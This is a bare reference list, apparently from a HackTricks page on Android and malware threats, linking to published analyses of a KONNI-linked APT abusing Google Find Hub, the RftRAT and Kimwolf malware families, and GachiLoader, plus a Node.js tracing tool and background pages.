- KONNI-linked APT abuses Google Find Hub to wipe Android devices after Windows intrusion – [genians.co.kr](https://www.genians.co.kr/en/blog/threat_intelligence/android)
- Android Find My Device (Find Hub) – [google.com/android/find](https://www.google.com/android/find)
- RftRAT/RFTServer technical analysis – [asec.ahnlab.com](https://asec.ahnlab.com/en/59590/)
- HMAC background – [wikipedia.org/wiki/HMAC](https://en.wikipedia.org/wiki/HMAC)
- Kimwolf Android TV Botnet: ENS-Based C2 Evasion, TLS+ECDSA C2 Protocol, and Large-Scale Proxy/DDoS Operations – [blog.xlab.qianxin.com](https://blog.xlab.qianxin.com/kimwolf-botnet-en/)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [Nodejs-Tracer – GitHub](https://github.com/CheckPointSW/Nodejs-Tracer)

{{#include ../../banners/hacktricks-training.md}}
